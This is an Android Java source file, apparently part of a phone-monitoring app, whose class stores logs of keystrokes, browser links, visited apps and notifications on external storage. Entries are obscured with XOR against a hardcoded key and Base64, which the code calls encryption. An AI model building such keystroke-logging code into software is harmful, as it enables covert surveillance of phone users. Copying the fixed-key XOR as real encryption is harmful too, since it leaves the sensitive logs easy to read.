package com.icontrol.protector;

import static com.icontrol.protector.UtliTools.deleteRecursive;

import android.os.Environment;
import android.util.Base64;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.util.Random;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class ActivityMonitors {

    public static boolean isLiveStrokes = false;

    public enum ActivityType {
        ACTZ,//activitys
        KSTR,//keystorkes
        BLNK,//browser links
        VAPS,//VisitedApps
        NTFS,//notifications
        ARTS//Alerts
    }

    public static String Load(ActivityType type) {

        try {
            String Typename = type.name();
            String path = Environment.getExternalStorageDirectory().toString() + "/IC/" + Typename;
            File directory = new File(path);
            File[] files = directory.listFiles();
            String Allnames = "";
            for (int i = 0; i < files.length; i++) {
                Allnames += files[i].getName().replace(".txt", "") + "<*P*>";
            }
            return Allnames;
        } catch (Exception e) {

        }
        return "null";

    }


    //writing
    public static void Record(String text, ActivityType type) {
        Thread thread = new Thread(new Runnable() {
            public void run() {
                //BufferedWriter buf = null;
                try {
                    String Typename = type.name();
                    String mydate = android.text.format.DateFormat.format("yyyy-MM-dd", new java.util.Date()).toString();
                    File sdDir = android.os.Environment.getExternalStorageDirectory();
                    File dir = new File(sdDir, "IC/" + Typename);
                    File TargetFile = new File(dir, mydate + ".txt");

                    if (!dir.exists()) {
                        dir.mkdirs();
                    }

                    // Check file size and rename if needed
                    if (TargetFile.exists() && TargetFile.length() >= 2 * 1024 * 1024) { // 3MB limit
                        File renamedFile;
                        String newFileName;
                        Random random = new Random();
                        do {
                            newFileName = mydate + "_" + random.nextInt(10000) + ".txt";
                            renamedFile = new File(dir, newFileName);
                        } while (renamedFile.exists()); // Ensure unique filename

                        TargetFile.renameTo(renamedFile);
                        TargetFile = new File(dir, mydate + ".txt"); // Create new file reference
                    }

                    if (!TargetFile.exists()) {
                        TargetFile.createNewFile();
                    }

                    // Encrypt the text and use a delimiter to separate entries
                    String FinalText = en(text + ">") + ":::";
                    try (FileOutputStream fos = new FileOutputStream(TargetFile, true);
                         OutputStreamWriter osw = new OutputStreamWriter(fos);
                         BufferedWriter writer = new BufferedWriter(osw)) {
                        writer.write(FinalText);

                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();
    }



    //clear = delete the folder
    //remove (below) = delete specific file
    public static void Clear(ActivityType type) {


        try {
            String Typename = type.name();
            File sdDir = android.os.Environment.getExternalStorageDirectory();
            File dir = new File(sdDir, "IC/" + Typename);
            if (dir.exists()) {
                deleteRecursive(dir);
            }

        } catch (Exception e) {

        }

    }

    public static String Read(String filename, ActivityType type) {
        BufferedReader br = null;
       // FileChannel channel = null;
       // FileLock lock = null;
        String Typename = type.name();
        File sdDir = android.os.Environment.getExternalStorageDirectory();
        File out = new File(sdDir + "/IC/" + Typename + "/", filename + ".txt");

        StringBuilder result = new StringBuilder();
        try {
            FileInputStream fis = new FileInputStream(out);
           // channel = fis.getChannel();

            // Try to acquire the lock
          //  lock = channel.lock(0L, Long.MAX_VALUE, true); // Shared lock

            br = new BufferedReader(new InputStreamReader(fis));
            StringBuilder text = new StringBuilder();
            String line;

            try {
                while ((line = br.readLine()) != null) {
                    text.append(line);
                }
                // Split the entire file content using the delimiter ':::'
                String[] encryptedBlocks = text.toString().split(":::");
                for (String encryptedBlock : encryptedBlocks) {
                    if (!encryptedBlock.trim().isEmpty()) {
                        result.append(de(encryptedBlock)); // Decrypt each block and append
                    }
                }
            } catch (IOException e) {
                // Handle exception
            } finally {
                if (br != null) {
                    br.close();
                }
//                if (lock != null) {
//                    lock.release();
//                }
//                if (channel != null) {
//                    channel.close();
//                }
            }
        } catch (Exception ex) {
            // Handle exception
        }

        return result.toString();
    }

    public static void Remove(String filename, ActivityType type) {
        String Typename = type.name();
        File sdDir = android.os.Environment.getExternalStorageDirectory();
        File out = new File(sdDir + "/IC/" + Typename + "/", filename + "\n" + ".txt");
        if (!out.exists()) {
            out = new File(sdDir + "/IC/" + Typename + "/", filename + ".txt");
        }

        try {
            if (out.exists()) {
                out.delete();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static final String SECRET_KEY = "1234567890123456"; // Fixed key

    public static String en(String input) {
        try {
            byte[] key = SECRET_KEY.getBytes("UTF-8");
            byte[] inputBytes = input.getBytes("UTF-8");
            byte[] result = new byte[inputBytes.length];

            for (int i = 0; i < inputBytes.length; i++) {
                result[i] = (byte) (inputBytes[i] ^ key[i % key.length]);
            }

            return Base64.encodeToString(result, Base64.DEFAULT);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return input;
    }

    public static String de(String encryptedInput) {
        try {
            byte[] key = SECRET_KEY.getBytes("UTF-8");
            byte[] inputBytes = Base64.decode(encryptedInput, Base64.DEFAULT);
            byte[] result = new byte[inputBytes.length];

            for (int i = 0; i < inputBytes.length; i++) {
                result[i] = (byte) (inputBytes[i] ^ key[i % key.length]);
            }

            return new String(result, "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
        }
        return encryptedInput;
    }



}
